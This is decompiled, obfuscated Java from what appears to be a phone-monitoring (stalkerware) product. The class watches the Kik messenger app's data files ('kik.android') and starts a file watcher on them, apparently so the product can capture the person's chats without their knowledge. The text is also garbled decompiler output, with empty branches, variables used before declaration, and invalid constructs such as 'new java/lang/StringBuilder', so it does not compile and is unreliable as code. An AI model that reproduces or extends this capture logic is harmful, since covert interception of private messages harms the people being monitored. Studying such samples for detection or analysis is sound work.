package com.vvt.capture.kik.a;

import com.vvt.base.capture.e;
import com.vvt.base.capture.i;
import com.vvt.io.j;
import com.vvt.io.m;
import java.io.File;

public class b
  implements e, m
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.b;
  private static final boolean c = com.vvt.ak.a.e;
  private c d;
  private i e;
  private j f;
  private boolean g;
  
  public void a(i parami)
  {
    boolean bool = a;
    if (bool) {}
    bool = true;
    this.g = bool;
    this.e = parami;
    j localj = this.f;
    if (localj == null)
    {
      localj = j.a();
      this.f = localj;
    }
    localj = this.f;
    String str = "kik.android";
    localj.a(str, this);
    bool = a;
    if (bool) {}
  }
  
  public void a(String paramString)
  {
    bool = a;
    if (bool) {}
    try
    {
      localc = this.d;
      if (localc != null)
      {
        bool = a;
        if (bool) {}
        localc = this.d;
        localc.stopWatching();
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        c localc;
        bool = c;
        if (!bool) {}
      }
    }
    localc = null;
    this.d = null;
    bool = a;
    if (bool) {}
  }
  
  public void a(String paramString1, String paramString2) {}
  
  public void b()
  {
    bool = a;
    if (bool) {}
    bool = false;
    Object localObject = null;
    try
    {
      this.g = false;
      localObject = this.d;
      if (localObject != null)
      {
        bool = a;
        if (bool) {}
        localObject = this.d;
        ((c)localObject).stopWatching();
      }
      localObject = this.f;
      if (localObject != null)
      {
        localObject = this.f;
        String str = "kik.android";
        ((j)localObject).a(str);
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool = c;
        if (!bool) {}
      }
    }
    localObject = null;
    this.d = null;
    bool = a;
    if (bool) {}
  }
  
  public void b(String paramString1, String paramString2)
  {
    boolean bool1 = a;
    if (bool1) {}
    Object localObject1 = com.vvt.n.a.c.a.b(paramString2);
    Object localObject2 = new java/lang/StringBuilder;
    ((StringBuilder)localObject2).<init>();
    localObject2 = ((StringBuilder)localObject2).append(paramString2);
    String str = File.separator;
    localObject1 = str + (String)localObject1;
    localObject2 = new java/io/File;
    ((File)localObject2).<init>((String)localObject1);
    boolean bool2 = ((File)localObject2).exists();
    if (bool2)
    {
      localObject2 = this.d;
      if (localObject2 == null)
      {
        bool2 = b;
        if (bool2) {}
        localObject2 = new com/vvt/capture/kik/a/c;
        ((c)localObject2).<init>(this, (String)localObject1);
        this.d = ((c)localObject2);
        localObject1 = this.d;
        ((c)localObject1).startWatching();
      }
    }
    bool1 = a;
    if (bool1) {}
  }
  
  public void c(String paramString1, String paramString2) {}
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/kik/a/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */